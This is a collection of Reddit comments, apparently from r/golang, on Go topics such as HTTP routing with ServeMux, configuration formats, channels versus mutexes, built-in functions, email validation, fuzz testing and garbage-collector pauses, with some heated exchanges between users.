I think the initial answer to the first part of your question is that nobody uses http.ServeMux, rather they use any one of a number of other routers. Really, it doesn't support nearly enough functionality for more than the most basic of applications, so this isn't terribly surprising. Offhand, I know at least github.com/gorilla/mux supports prefix mounting since I've used that functionality. That being said, it's *very* rare that your handlers should ever be aware of the path that they're being invoked under, I'd usually consider it an outright anti-pattern. As for error handling, my first inclination is to say that this problem means that your logic is too spread out over HTTP handlers. I've found that ensuring all errors traverse a single code path, so that you can configure error -&gt; HTTP status mapping in a single location. Solving the problem for http.FileServer is a little trickier. But, recalling that http.ResponseWriter is an interface, it should be possible by wrapping the returned http.Handler in your own handler which overrides the response writer such that it handles errors codes written by the http.FileServer as per your customizations.
Personally, I love TOML. I think it's WAY better for configuration than either json or YAML. YAML is nice to read, but it's a nightmare to write.... significant whitespace is just a terrible idea for something you want people to be able to write by hand. TOML, on the other hand, was designed to be readable *and* writeable. And I think it succeeds. It loses a little bit in readability over yaml, but it makes up for it in being far far less error prone to write.
&gt; That being said, it's very rare that your handlers should ever be aware of the path that they're being invoked under, I'd usually consider it an outright anti-pattern. What do you mean with that? Do you mean: * It's an antipattern that you have to tell a handler what subtree it is responsible for. * It's an antipattern that a handler has to receive a subtree with stripped prefix * something different?
I really like all 3, for different purposes. Environment Variables are good for things you don't really want written down, like your AWS secret. Configuration files are really nice for repeatably running the same thing over and over in a standard way, without having to specify a dozen command line flags each time. And flags are great for scriptability and one-offs. There's no reason you can't use all three. flags &gt; config file &gt; env vars &gt; defaults Yes, you have to document config files and environment variables... but you have to document flags, too. Yes, Go flags are self-documenting... no reason why you can't use a package that self-documents configuration files and env vars too.
I meant the first. Think about the case where you have a handler which renders a resized PNG. It would be very bad if the handler only worked when you used it on /img/{name}.png, but equally bad if it only worked on /&lt;any subpath&gt;/img/{name}.png. The easiest way to avoid that problem is to avoid having handlers know where they are mounted or examine the request path. I'm guessing this comes up because http.ServeMux doesn't really have URL to parameter support?
&gt; It would be very bad if the handler only worked when you used it on /img/{name}.png, but equally bad if it only worked on /&lt;any subpath&gt;/img/{name}.png. That's a problem I solve with the call to StripPrefix() so every handler can pretend to have its own subtree rooted at /. Not an ideal situation, but it works good enough.
Couldn't you set up a (private) docker image with the correct environment? I've never tried this out, but it seems like a nice middle ground, although keeping versions in sync could be an issue.
This is commonly called table driven tests. It's pretty awesome.
There's no real need to use an anonymous type, you can define a type right in the function itself and it'll be scoped to just the function: http://play.golang.org/p/cQC5v4HsA8 Having named types makes your code a lot clearer, as well as nicer error messages. 
I keep forgetting that you can nest most any declaration in go!
Yeah, that's not generally a bad way to go. I've found that with a router that parses params out of the URL, you rarely need to touch the path, which can eliminate that bit of complexity.
Thanks, i will definitely try it out !
&gt;Could someone give me a small primer on when and when not to use pointers in Go? [Some comments from when I asked a similar question](http://www.reddit.com/r/golang/comments/1372mh/eli5_pointers_example_usage/) 
a `ioutil.ReadFile`? And then producing `io.Reader` out of it?! Opened file will produce `io.Reader` also. Without dumping whole blob to memory.
&gt; it's not functional so it sucks Which is true, though.
Here is another version http://play.golang.org/p/qFQPdECRSb
Any feedback would be appreciated.
Thanks for the feedback. Article updated with new example.
I can't help but think that a lot of these kinds of problems can be mitigated by using channels instead. What has everyone else's experience been?
&gt;Generics is somewhat of the elephant in the room when dealing with Go. That is true, but you can usually wrap your complicated container class using interface {} with a small wrapper to get back type safety. So the current lack of generics doesn't bother me much.
Channels are awesome but they can still cause "deadlocks". Often I've seen it because a channel buffer fills up or a read becomes blocking because there is nothing to receive. Both situations are easy to get around with selects, but generally all the program can do at that point is panic or return early. So it really just changes a deadlock into a " controlled" crash.
This article doesn't seem to contain anything that anyone needs to know about. &gt; Go is becoming an important programming language which we enjoy following. It’s a fun and inclusive community that we want to better get to know. 
You can still get compile time type safety. You can only export the creation functions for the reified types, so it is not possible to create some other interface {} object and pass it in. Here's some discussion of it in the golang nuts mailing list. https://groups.google.com/d/msg/golang-nuts/UyKree3BCQ0/uRvrY9LaFYQJ
I'm planning on writing an automated tagger based on beets in Go... but still don't know what to use for tagging mp3s. Any ideas? I can't even find any good music tagging libraries other than mutagen.
True. Maybe it is just the stuff I've been working on, but when I've encountered a problem with channels like you have described, it seemed fairly easy to reason about and fix. So in my mind it doesn't seem like such a problem.
Definitely some rough edges, but the example should work (it was pretty much a straight-up copypaste from my bot). I'll look into it.
Mildly interesting: Tu is the Polish word for "here".
I think var githash string should be enough instead of var ( githash string = "" )
So anyone who doesn't trust Rob Pike or Ken Thompson is a "fuckwitt" and people aren't allowed to bitch on the internet, a medium that you would think at this point is suppose to epitomize free expression. Also I think it's quiet a stretch to call that blog post "bitching". If you think that's bitching then you've really never really experienced being bitched out by someone and any sort of criticism will send you into a state of defensive frenzy.
Can we please stop with all the blogspam in here? It feels like more than 50% of the content in /r/golang is blogposts that do nothing more than saying "look how I can use the standard API as documented!". These blog posts are super-annoying click-bait and they don't contribute any quality to this subreddit.
Why do people keep posting their shitty blogspam with nothing more than a few poorly-written lines about how they "discovered" this marvellous functionality of the Go standard library. Perhaps somebody should tell them that there's http://golang.org/pkg …
&gt; Also I think it's quiet a stretch to call that blog post "bitching". I was not claiming that the linked blog post was bitching, I realize that the argument could be difficult to follow if you lack basic reading comprehension, so I'll help you out. Look a the top level comment (I'll quote it here to make things easy for you): &gt; Really no point posting it here, every time I see someone trying to bring constructive criticism to the table in this sub, he gets downvoted to oblivion. Not sure why go "fans" are especially prone to this behavior but it's definitely a thing here. This comment sets the topic for the rest of the thread: blog posts which criticise Go being downvoted on /r/golang. Yes, the blog post linked from here is used for examples, but it is not the topic of this particular thread, critical blog posts in general are. My comment explains why critical blog posts are downvoted on /r/golang. To clarify, only paragraph 5 (the one which begins "The article...") in my comment was referring to the blog post linked to here, whilst the remainder was in the context of the comment quoted above (critical blog posts in general). &gt; So anyone who doesn't trust Rob Pike or Ken Thompson is a "fuckwitt" and people aren't allowed to bitch on the internet No, not everyone who doesn't trust Rob Pike or Ken Thompson is a fuckwitt. A lot of them are, but not all of them. They're also perfectly allowed to bitch on the internet, so long as they don't bring it to /r/golang. &gt; a medium that you would think at this point is suppose to epitomize free expression. Once again, they're welcome to be fuckwitts and bitch as much as they like - I have nothing against that - but when they bring their bitching to /r/golang and don't expect to be downvoted, they're being delusional. 
The author didnt really show his **flawed design** in the article and how he overcame. This is what he said, **explicitly pass them instead of relying on Mutex**. I have no idea whats going on !
The author here. I am sorry that I have not been able to convey the issue more clearly. The code is available on [github.com](https://github.com/BotBotMe/botbot-bot) and the product is here https://botbot.me. Let me try to sum it up here differently. Everything started because the some of the goroutines would deadlock and the application would hang. Several factors were leading to this situation : * multiple goroutines changing mutable on the [same pointer](https://github.com/BotBotMe/botbot-bot/blob/master/network/irc/irc.go#L61-L79) * Unexpected behavior lead to dead lock and race conditions Armed with the new race detector I first went down the rabbit all of adding a lot of Mutex to avoid the race condition and the unexpected behavior. This helped a lot to avoid the race conditions but did not resolved the deadlocks between independent goroutines sharing mutable state. The problems started to get back in order when I have refactored many of this independent goroutines into fewer more cohesive ones. A single large `select` is much easier to reason about than several smaller one interacting together. Mutex are very important part of the language but it is not always the best tool to solve races. There usage can be in some occasion avoided by reducting the number of independent goroutine or by explicitly passing a variable to a goroutine.
I honestly don't think that this is a fair question, considering that built-in's aren't functions the same way 'func' declarations are. They provide behavior that isn't composable any other way - they are atoms of the language specification. Then again, they also didn't say *User* Defined Function, which is really what I expected this to mean. Oh well. While it's a fair way down the list, I'd like to think that fmt.Errorf() is the right answer. Everything else above that is either used in unit-tests or are built-in language features. As an aside, it's kind of crazy that fmt.Errorf() is preferred over error's own constructor.
Yeah, those criticisms are totally fair. The question was not clear. We are giving a t-shirt to everyone who guessed. :) We'll open up our API so other folks can compute stats with the data soon. The top user-defined functions, other than the codegenned one in the existing list, are these 2: https://sourcegraph.com/github.com/mitchellh/multistep/.GoPackage/github.com/mitchellh/multistep/.def/StateBag/Get https://sourcegraph.com/github.com/garyburd/redigo/.GoPackage/github.com/garyburd/redigo/redis/.def/Conn/Do (Again, the same caveats apply.)
Agreed; `builtin.len` isn't even a function, and the package `builtin` [isn't even a package](http://golang.org/pkg/builtin/): &gt; Package builtin provides documentation for Go's predeclared identifiers. The items documented here are not actually in package builtin but their descriptions here allow godoc to present documentation for the language's special identifiers. It is in fact [special-cased by the compiler](https://code.google.com/p/go/source/browse/src/cmd/6g/cgen.c#335), which generates appropriate code for the type of its operand: case OLEN: if(istype(nl-&gt;type, TMAP) || istype(nl-&gt;type, TCHAN)) { // map and chan have len in the first int-sized word. // a zero pointer means zero length regalloc(&amp;n1, types[tptr], res); cgen(nl, &amp;n1); nodconst(&amp;n2, types[tptr], 0); gins(optoas(OCMP, types[tptr]), &amp;n1, &amp;n2); p1 = gbranch(optoas(OEQ, types[tptr]), T, 0); n2 = n1; n2.op = OINDREG; n2.type = types[simtype[TINT]]; gmove(&amp;n2, &amp;n1); patch(p1, pc); gmove(&amp;n1, res); regfree(&amp;n1); break; } if(istype(nl-&gt;type, TSTRING) || isslice(nl-&gt;type)) { // both slice and string have len one pointer into the struct. // a zero pointer means zero length igen(nl, &amp;n1, res); n1.type = types[simtype[TUINT]]; n1.xoffset += Array_nel; gmove(&amp;n1, res); regfree(&amp;n1); break; } fatal("cgen: OLEN: unknown type %lT", nl-&gt;type); break; `len()` is decidedly not a function. (Edit: I will, however, call it a "built-in function", as the spec says.)
From the specification: &gt; The built-in functions len and cap take arguments of various types and return a result of type int built-in functions are still functions, even if they have special implementations in the compiler. The difference that is being made here is that of function vs keyword, and len, make, etc are all functions – you can shadow their identifiers. That they're functions is also reflected in their representation in the AST.
Hey, it's all good. I'm just glad that someone is doing some fun things to promote Go. :)
&gt; The built-in functions len and cap take arguments of various types and return a result of type int I'm choosing to interpret "built-in function" as a phrase distinct from "function". I for one would love to write a function like `make()` that takes a type name and returns a value of that type, or a function that can be evaluated at compile time and used as a constant, but "functions" can't do that. The spec says "Built-in functions are predeclared. They are called like any other function", which implies (as you say) that built-in functions are a kind of function. However, every other occurrence of the phrase "built-in function" in the spec denotes behavior where "built-in functions" do something different from "functions", and there are a lot of them – enough differences, I argue, that "built-in functions" are in fact distinct from "functions".
If Rob Pike tells me it's a function, then it's a function. Until then I'll call it a "built-in function".
&gt; That they're functions is also reflected in their representation in the AST. The AST [actually shows the opposite](https://code.google.com/p/go/source/browse/src/cmd/gc/go.h#433): // Node ops. enum { //… OCALL, // function call, method call or type conversion, possibly preceded by defer or go. OCALLFUNC, // f() OCALLMETH, // t.Method() OCALLINTER, // err.Error() OCALLPART, // t.Method (without ()) //… OLEN, // len Built-in functions get node ops specifically for themselves, entirely distinct from function calls.
&gt; Really, it doesn't support nearly enough functionality for more than the most basic of applications, so this isn't terribly surprising. I'm going to have to disagree here. All too often do I see people trying to use a bulldozer to deconstruct their lego set. Sure, there are plenty of routers out there that provide a larger feature-set, but a lot of the time most of the features provided are unneeded and are either unused or used improperly. The standard library's ServeMux is plenty powerful for far more than "only the most basic of applications", and I'd argue that if you can make do with ServeMux, there's no reason to go tacking on extra dependencies to your application. One of the great things about Go (perhaps the greatest), is that the standard library is very powerful and well maintained. 
That's probably because there are no good music tagging libraries other than mutagen. If you only care for mp3s, you'll probably be able to find something id3 specific, but generic ones? Mutagen and maybe taglib (which is used by tu and tagutil, mainly because tagutil is C). But with taglib you're already sacrificing some features. So, assuming you don't plan to roll your own from scratch*, I'd go with mutagen. It may feel weird to depend on Python in Go app, but sometimes there's just no better way. *Actually, I do, but sshh... it's still hidden in the future ;-).
Haha, indeed it is :-). Funny how one's mind can get stuck on one meaning of word (tu for TagUtil, of course) to not even see the other obvious one.
Thanks for the response. So basically. if I understand correctly, earlier you had several go routines operating on **ircBot** struct. Now you reduced those into just 3 go routines (first in **listenSendMonitor**, second in **readSocket** and third anonymous go routine). The third anonymous go routine had a copy of **ircBot**. And I think this is what you referred to as when you said **pass them instead of relying on Mutex**. All the read operations were consolidated in **listenSendMonitor** to avoid deadlocks ! And use mutexes or channels (communicating by channels) to avoid races !!
O, I get it now. Never actually considered what a bikeshed looked like. Not sure if I'm happy with the color, though.
Yeah that's the conclusion I came to too. I'm mostly interested in mp3, flac, and mp4 since 99% of my own library fit within those. I'll probably end up using something taglib based and then roll my own... or if you beat me to it, use yours.
Anyone else notice the mention of a breaking change with how the unsafe package works? They did that with go 1.3, as well - they disallowed using unsafe to cast from integer to pointer types then. Is unsafe excluded from the go 1 compatibility guarantee? Is that documented anywhere? Being unsafe, it doesn't bug me (being unsafe and all), but I am curious. 
I think the main argument made here is that Go is a terrible language for programming in Scala. I can see that. I disagree with some of the points, like Go not having *any* immutable data structures. Strings are immutable, and I made an [effectively immutable version of a map](https://github.com/mcvoid/persistent) just this week. Also, applying functions to map or reduce built-in collections is possible without generics, since you have type information for those. Also, the unsafe library is what breaks the type system, not interface{} as they claim.
If the collector needs to run that long, yes, but it does not mean that the GC will run every 50ms. This is just describing a single cycle. As I understand it, when the runtime decides to GC: Step 1: stop-the-world and collect for 10ms (or until done, whichever comes first). Step 2: concurrently collect for 40ms (or until done, whichever comes first). Repeat from step 1 again until collection cycle is complete. Edit: Hopefully, these timings will be tunable for the application.
If my server needs to handle every request in under 2ms, which it does now, how can it still guarantee that with gc like that?
The discussion on golang-dev: https://groups.google.com/forum/#!topic/golang-dev/pIuOcqAlvKU
Keep your heap small, and the GC cycle can complete very fast. Edit: The current GC will stop the world as long as it needs to (but with a concurrent sweep), so you will be better off in any case. Some good info here on debugging GC pause times among other things: https://software.intel.com/en-us/blogs/2014/05/10/debugging-performance-issues-in-go-programs
ServeMux has been quite powerful in my opinion. However, I see it as one building block for a more nuanced uses. Applications vary so much, though, that there's not a great way to create a one-size-fits-all solution, at least in terms of a single type or package. I wrote a package, [Muxchain](https://github.com/stephens2424/muxchain), that tries to address this problem in both a modular way and building off of the great things `net/http` already provides. In particular, I think you'd be interested in [PathMux](https://godoc.org/github.com/stephens2424/muxchain/muxchainutil#PathMux). With it, you can do things like: myPathMux := muxchainutil.NewPathMux() myPathMux.Handle("/blog/:article", myBlogHandler) Where you can access article as a pseudo-query parameter. func (m BlogHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) { articleID := r.FormValue("article") ... } Since PathMux is an `http.Handler`, it meshes well with any other `net/http` mechanism. For errors, I would chain them together with a regular MuxChain: muxchain.Default.Chain("/", checkAuth, myPathMux, notFound) Since the first handler to write an actual response ends the chain, the notFound handler will return 404 if nothing else does. `checkAuth` could check if any auth is needed and present, returning 401 or 403 with an appropriate error page if needed. This is at least how I've solved it, and it's been working for the use cases I have. It really just uses `http.ServeMux` under the hood, and I still use that directly when I don't need any more advanced features.
Well, you can see more [here](https://github.com/boltdb/bolt/issues/237) about BoltDB and LMDB. benbjohnson told me that he would not add these dangerous configurations which LMDB has, but still something can be optimized. Thank you!
Of the 15007 uses of the only entry outside the stdlib (`github.com/metaleap/go-xsd/types.OnWalkError`), 9401 uses looks to come from a [single file](https://sourcegraph.com/github.com/metaleap/go-xsd-pkg@eb49510656a41fa0aa024c49a85fea9e371ed46e/.tree/docbook.org/xml/5.0/xsd/docbook.xsd_go/docbook.xsd.go#startline=58065&amp;endline=58073&amp;symbol=/github.com/metaleap/go-xsd/.GoPackage/github.com/metaleap/go-xsd/types/.def/OnWalkError)
Pretty interesting. Hard to get a feel for it without examples though? I couldn't find any, but am on mobile so maybe I missed it. Packages look nicely designed though. 
Source code examples are available via the installation instructions (or [https://github.com/azul3d/examples](here on GitHub)). The project is still in early stages -- more impressive examples and screenshots will come soon enough.
Oh man you're right! /ragequit Haha I have been waiting for the generics line for a long time - I'm glad it's in the form of a joke haha. Source code examples are available via the installation instructions (or [https://github.com/azul3d/examples](here on GitHub)). The project is still in early stages though -- more impressive examples and actual screenshots will come soon enough.
so... any problems with the GC so far? By far the GC has been a consistent criticism of Go. A 3D engine is the type of application that is most susceptible to it.
Remember that the package name is part of the call signature. e.g. if govalidator.IsEmail(email) {} // vs if valid.Email(email) {} // vs if is.Email(email) {} govalidator.SafeFileName(filename) // vs sanitize.FileName(filename) * Don't use underscore in your test names. * Some of the functions have nothing to do with validation. (e.g. StripLow, SafeFileName, ToBoolean)
&gt; But if I can't send message, how I can be sure that is valid email? Ah, but doesn't that change the question to: do I *care* if it's a valid email? To look at it pragmatically, if it's never used to send a message, does it matter? I get the desire to always store valid data, but at the end of the day, one has to consider what's "good enough." And it's not like this is anything new or revelatory. This is why every service on the planet that relies on emails for notifications, always puts you through the "verify your email" workflow. They didn't all just decide to be obnoxious jerks when building out their websites - they all converged on the only reliable way to solve the problem. &gt; What about this valid email address? &gt;&gt; 伊昭傑@郵件.商務 Yup. Now you're getting it. The current regex you have isn't a complete solution, as there is this international standard to consider. So, what else isn't covered? The problem space is too large to ever be completely confident that you won't reject some esoteric email format that is outside all the known specifications. The most flexible solution is some variation of: "is there an at-cost in the middle?"
Some good discussion also here: https://news.ycombinator.com/item?id=8151028
https://news.ycombinator.com/item?id=8151853
Will it have support for Mac eventually?
Wait, wait.... drone and travis *and* wercker? Why are you running this on three different CI systems?
When I only start my work, I tried to learn how those CI systems works with Go. It's give me interesting results. For example, sometimes my build fail on Travis when similar code works fine on Wercker
See here: http://azul3d.org/doc/faq.html#what-about-the-garbage-collector
This is to test that your application doesn't crash or misbehave when it's given garbage input.
You may want to ensure your CI configuration targets desired Go version. Other than that there's no reason for this behavior. Well, maybe except flaky tests (time-sensitive, environment-sensitive etc.), but surely you haven't got any.
It's a good way to test resilience, but randomisation in automated testing is a nightmare for reproducing edge case issues. Just be sure to keep your randomised testing out of CI, their place is in highly repeated brute force testing.
Just skimmed over it, but looks good. Will try it out in a coming project :)
See [Fuzz testing] (http://en.m.wikipedia.org/wiki/Fuzz_testing). It is powerful and underutilized.
Save the random seed then. Using reproachable seeds is a good feature request, if it isn't already in there. (Using phone, hard to read source code.)
I don't think this would be useful in a general test file that you want to pass on every build - but would be super-useful to run in order to FIND garbage input that you could then write a test around.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Fuzz testing**](https://en.wikipedia.org/wiki/Fuzz%20testing): [](#sfw) --- &gt; &gt;__Fuzz testing__ or __fuzzing__ is a [software testing](https://en.wikipedia.org/wiki/Software_testing) technique, often automated or semi-automated, that involves providing invalid, unexpected, or [random data](https://en.wikipedia.org/wiki/Random_data) to the inputs of a [computer program](https://en.wikipedia.org/wiki/Computer_program). The program is then monitored for exceptions such as [crashes](https://en.wikipedia.org/wiki/Crash_(computing\)), or failing built-in code [assertions](https://en.wikipedia.org/wiki/Assertion_(computing\)) or for finding potential [memory leaks](https://en.wikipedia.org/wiki/Memory_leak). Fuzzing is commonly used to test for security problems in software or computer systems. &gt;The field of fuzzing originated with Barton Miller at the [University of Wisconsin](https://en.wikipedia.org/wiki/University_of_Wisconsin) in 1988. This early work includes not only the use of random unstructured testing, but also a systematic set of tools to evaluate a wide variety of software utilities on a variety of platforms, along with a systematic analysis of the kinds of errors that were exposed by this kind of testing. In addition, they provided public access to their tool source code, test procedures and raw result data. &gt;There are two forms of fuzzing program, *mutation-based* and *generation-based*, which can be employed as [white](https://en.wikipedia.org/wiki/White-box_testing)-, [grey](https://en.wikipedia.org/wiki/Gray-box_testing)-, or [black](https://en.wikipedia.org/wiki/Black-box_testing)-[box testing](https://en.wikipedia.org/wiki/Software_testing#The_box_approach). [File formats](https://en.wikipedia.org/wiki/File_format) and [network protocols](https://en.wikipedia.org/wiki/Protocol_(computing\)) are the most common targets of testing, but any type of program input can be fuzzed. Interesting inputs include [environment variables](https://en.wikipedia.org/wiki/Environment_variable), keyboard and mouse [events](https://en.wikipedia.org/wiki/Event_(computing\)), and sequences of [API](https://en.wikipedia.org/wiki/Application_programming_interface) calls. Even items not normally considered "input" can be fuzzed, such as the contents of [databases](https://en.wikipedia.org/wiki/Database), [shared memory](https://en.wikipedia.org/wiki/Shared_memory), or the precise interleaving of [threads](https://en.wikipedia.org/wiki/Thread_(computer_science\)). &gt; --- ^Interesting: [^Fault ^injection](https://en.wikipedia.org/wiki/Fault_injection) ^| [^Robustness ^\(computer ^science)](https://en.wikipedia.org/wiki/Robustness_\(computer_science\)) ^| [^Concolic ^testing](https://en.wikipedia.org/wiki/Concolic_testing) ^| [^Input ^kludge](https://en.wikipedia.org/wiki/Input_kludge) ^Parent ^commenter ^can [^toggle ^NSFW](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cjlgdh3) ^or[](#or) [^delete](http://www.np.reddit.com/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cjlgdh3)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
Fuzzing is not part of the unit tests, but could be an additional form of testing next to unit/integration tests. 
To quote the Wikipedia article - "The technique can only provide a random sample of the system's behavior, and in many cases passing a fuzz test may only demonstrate that a piece of software can handle exceptions without crashing, rather than behaving correctly. This means fuzz testing is an assurance of overall quality, rather than a bug-finding tool, and not a substitute for exhaustive testing or formal methods." I learned something new today :D
You are testing that it doesn't crash. fuzz tests are not flaky unless something exists that will make you crash, in which case you can copy that data to a separate test to ensure that it stays fixed. (gofuzz also offers a seed for repeatability.)
&gt; randomisation in automated testing is a nightmare for reproducing edge case issues. Which is why you should print out the pseudo-random seed for reproducibility. The flag package makes it easy to pass a seed to a test.
&gt; GOs packages have everything inside the same file That's simply not true. Some numbers from the standard library: fmt package: 4 files net/http package: 16 files math package: 42 files ... 1 package = 1 directory, not 1 file
Not only can go handle multiple files in a package, it can compile them all to a single binary in a single "go build" invocation, along with all packages which it depends upon. With javac you compile the classes in a package one at a time, in the order of dependencies, and end up with a whole mess of .class files which then have to be jar'd together - definitely not a one-liner.
Thanks for the link that helped. One thing i found there is, it says a separate dir has to be created for each package. If i have an application which uses multiple packages, i will create a separate dir for each of them but the main package also needs is own dir? which mean each go application i write will have its own workspace?
Looks like a fun little project! Bonus points if you add sleep sort and bogo sort.
ah okay, GOPATH is exactly like classpath telling what packages are available to be linked ?
The visualization of your program is not at all like the ones in your readme, which is a bit misleading. Tip, you can swap variables in go using: a, b = b, a
added: https://github.com/SimonWaldherr/GolangSortingVisualization/commit/82226c1b5f9106ea300b621403b3112a0ca46f3c
An asshat on SO is still an asshat on reddit.
One of the benefits of Go's more lenient approach is you get C#-like partial classes for free. That is, code can be generated for a type say Account in `account_generated.go` and a user can add custom methods to that type in a separate file `account.go`. I tend to follow a struct per file, like Java, for most projects.
&gt; I personally like the Java convention so when im looking at a java file im looking at a specific feature. I would observe that Java has been around for nearly two decades and has been a dominant language (not "the", but "a") for at least 10... and of all the dozens of new languages I've seen since then, not a single one has picked up that feature, nor seems to have any desire to pick it up. This means something. (See also "checked exceptions".) As others observe, you can split into multiple files, and you should split however makes sense for your package.
Really cool idea! 
Thanks, I've since made a video demo of it being used for a few games. [(Link)](https://www.youtube.com/watch?v=L6XBu9QVB6w)
this is my version using interface. just like standard Sort.Interface http://play.golang.org/p/N18EHApJ_c
This is all well and good until someone puts a string into your tree of ints and it blows up at runtime. Which is exactly the problem with the other solutions suggested so far in this thread.
Yep that could be an issue. However you'd have to go through the trouble of defining the methods on a user defined string so it seems unlikely to be an issue in reality unless I'm missing something. Edit: ah never mind. A string could end up in my Int() cast in main and blow the thing up easier. 
rapidly approaching the C subreddit [to take 10th place](https://github.com/steaz/reddilytics) in all languages
Maybe I missunderstood your article, but I could not take advise from it. For example if you are doing simple Web/REST testing. Blackbox testing for example, where do you use interfaces? I am always on the look for guidance when it comes to Go, especially from experienced users, but maybe you could write a follow-up article which goes more in-depth. I feel like it only scratched the surface.
IMO folks who think this is good enough do not really understand the reasons for parametric types .
Yeah, i did see that so all that is different between make and new is that new returns a pointer why is there 2 diff builtins? If some one needs a pointer they can always get it with the &amp; operator, why have 2 diff APIs which raises these questions?
fmt.Println uses a default format that conceals the underlying difference. If you use the %#v format to render the maps as Go expressions, it becomes clear: // http://play.golang.org/p/KX1XT9p406 fmt.Printf("From make %#v\n", m) // From make map[string]main.Vertex{} fmt.Printf("From new %#v\n", *p) // From new map[string]main.Vertex(nil) Notice that the first is an initialized but empty map, while the latter is nil. A nil map isn't terribly useful; as soon as you index it you'll get a runtime panic: m["foo"] = Vertex{} // ok (*p)["foo"] = Vertex{} // panic: runtime error: assignment to entry in nil map 
okay, I found this piece of specification "That is, new(T) allocates zeroed storage for a new item of type T and returns its address, a value of type *T. In Go terminology, it returns a pointer to a newly allocated zero value of type T." What does this "zeroed storage" mean ? Is it similar to Java assigning null to non-initialized types?
Short answer, there are a few special cases which you cannot use the literal form, or the &amp; operator. Longer answer: new cannot be removed from the language, it has some use cases, but honestly you can just forget it exists.
Just curious, are you (the general gopher) glad it's becoming popular?
Fixed, thanks :)
Where is clojure? It has almost 6500 subs 
I like how their ranking system is transparent, and that they have an interactive version so you can build your own rankings with their data. I was able to get Go up to #3 with these ridiculous weights: http://spectrum.ieee.org/static/interactive-the-top-programming-languages#index/1/0/0/0/0/0/0/0/0/0/1/100/0/0/1/100/1/100/1/100/0/0/0/0/0/0/0/0/
Go is #1! http://spectrum.ieee.org/static/interactive-the-top-programming-languages#index/1/0/0/0/0/0/0/0/0/0/1/50/0/0/1/100/1/50/1/100/0/0/0/0/0/0/0/0/
i'll add it 
Wow, it has been a long time since I read something I disagreed with quite so much. This is coming from a C *and* Python background. 
I don't feel like replying to a troll post, but what the hell.. &gt; The Go designers seem to have put a lot of thought into the language but not as much into the environment. Try this. First setup a clean linux machine or if you want a bigger challange, a clean windows machine. Setup an environment where you can compile most of the examples in one language. In Go, you would need gcc, make, hg, git, golang... and you are done. But, yes, it could be made simpler. &gt; GOPATH is a Mess. (...snip...) This risks major coupling of projects and will lead to maintenance difficulty in the future. Why do you couple your projects then? &gt; volatile/atomic references Volatile is *NOT* for concurrency. &gt; Yes, they are powerful and elegant, but most modern environments have blocking queues. Yet, most languages do not use them. (One of the bigger exceptions is Erlang.) &gt; Go has incredible confusion whereby maps and slices (without an *) are pointers but arrays are not. Slices are not pointers. Maps are. But both are irrelevant details. And it's nothing magic, you can easily declare: type Map *content type Slice { len, cap int; s []byte } &gt; Programmers coming from more modern environments will be very surprised by this behavior. Depending what language person came from he would be surprised by either behavior. &gt; In most other languages, this can be accomplished with a one or two line change. And how often do you change scope of a function? And to make the change it involves writing a single gofmt command. &gt; Unlike with dynamic languages, knowledge of the type is required as it determines how the object can used. Hopefully, IDEs in the future can mitigate this but, currently, IDE support for Go is not good. The LiteIDE/GoSublime/IntellJ show quite nicely the types involved. &gt; The Go collector is comparatively unknown. Currently, it's a relatively simple mark and sweep system similar to the early HotSpot collector. There are no tuning options for the collector. You say like not having tuning options is a bad thing. How many of the 800 tuning options do you use in Java? Yes, the GC isn't as good as JVM-s, but they are working on it. &gt; Further, it makes writing library code much more difficult. If a library needs to work with maps it has to have a separate syntax than code that works with user-defined types. It simplifies things because people will need to use the same core types for their code, reducing fragmentation. And I believe remembering what 5 functions do isn't really difficult compared to remembering all the libraries for other languages. &gt; Unfortunately, Go seems to have missed the mark. Go users are unsatisfied with the proscribed method of dealing with dependencies. Yes, we are unsatisfied, but there really isn't a better solution. Manual management + vendoring is the only guaranteed way to keep your code compilable. &gt; This makes for extremely cumbersome code writing whereby most method calls must check an error code. Go should enhance panic/recover and update its libraries to use it. When you start to return proper error messages then the exceptional code will look terrible.
yeee!
Or, check out this [Go blog post about pipelines](http://blog.golang.org/pipelines) and this [Google I/O 2013 presentation about Advanced Go Concurrency Patterns](http://blog.golang.org/advanced-go-concurrency-patterns).
The expression make(map[int]int) produces a map with no content.
Yeah, seems this articles author may have missed a few points about Go. 1. Who needs to support an IDE? Like when I'm writing Ruby, I mostly use a text editor (vim/Sublime text). IDEs have been built by 3rd parties for Ruby, but they're just not necessary like in Java; and, I expect I'm not the only one who believes that the same is true for Go. 2. Create a [Gopath for each project](http://stackoverflow.com/a/10142340/1162491) or use one of the many community made dependency managers. 3. See [Go at Google: Language Design in the Service of Software Engineering](https://talks.golang.org/2012/splash.article) for Golang's motto: "Don't communicate by sharing memory, share memory by communicating." 4. The article doesn't even explain why the author believes that, "the concurrency features of Java, Clojure, Erlang and others it pales in comparison." I'm going to stop there - the quality of the article is that of the writing of someone who's uninformed, or has just drunk the koolaid of their newly found 'hot' language.
From *16. Errors* on [Go at Google: Language Design in the Service of Software Engineering](https://talks.golang.org/2012/splash.article) &gt; Go does not have an exception facility in the conventional sense, that is, there is no control structure associated with error handling. (Go does provide mechanisms for handling exceptional situations such as division by zero. A pair of built-in functions called panic and recover allow the programmer to protect against such things. However, these functions are intentionally clumsy, rarely used, and not integrated into the library the way, say, Java libraries use exceptions.)
Also, if you haven't read [Go at Google: Language Design in the Service of Software Engineering](https://talks.golang.org/2012/splash.article) I highly recommend it. I distilled my [highlights here](http://soryy.com/notes/2014-08-09-language-design-service-software-engineering/), but the original article isn't terribly long.
Yep :) you can do this form: if val, ok := x.(int); ok { // use val, which is an int } else { // handle something that is not an int } But yeah, whenever you have to cast an interface to a value.... it can fail if someone managed to get something bad into the interface that you weren't expecting.
hmmm... SQL and HTML in their list of programming languages.... also, "arduino" and "processing" .... is this just a list of keywords?
[Processing is a language](https://www.processing.org), though I have a hard time believing it is a virtual tie with Go. It's established and popular in its niche, sure, but it's niche is smaller.
Programming languages are one of the very few remaining things where more widespread adoption bothers me not one bit
\m/
